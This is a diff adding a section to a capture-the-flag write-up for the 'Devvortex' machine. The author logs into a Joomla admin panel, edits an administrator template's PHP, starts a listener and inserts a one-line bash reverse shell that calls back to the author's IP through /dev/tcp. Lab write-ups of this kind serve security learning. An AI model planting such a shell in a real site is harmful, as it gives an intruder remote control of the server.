@@ -69,7 +69,26 @@ I then use these crednetials on the log in page found earlier, and I'm logged in
 
 ![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/3beb8247-b2df-49a5-a490-1daf2199be42)
 
-# Joomla Dashboard
+# Joomla Dashboard and Reverse Shell
 
+I click around trying to see if there's anything that can lead me to the log in credentials of other users, but I find nothing. Eventually, I finally come across something interesting (which took longer than I'd care to admit)
+
+Found in the `System` tab, under Templates, is `Administrator Templates`:
+
+![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/d6d4249b-1314-4037-a67b-1dee35c08089)
+
+Clicking here leads us to the server side code of the administrator part of the site, and we can edit it!:
+
+![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/89b39c08-9cdd-4a39-847c-fa5d5ed64347)
+
+Bingo. From here, we can code in some php that will establish a reverse shell, which can grant us access to the devvortex server itself
+
+On my system, I create a listener on port 69:
+
+![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/6796b174-f024-468f-ba40-89cb1b41cd73)
+
+Back on the devvortex system, I add the line `exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.4/69 0>&1'");`, with `10.10.16.4` being my system's IP:
+
+![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/46054c87-6b9e-42d8-b9b9-f686fc0709f4)
 
 
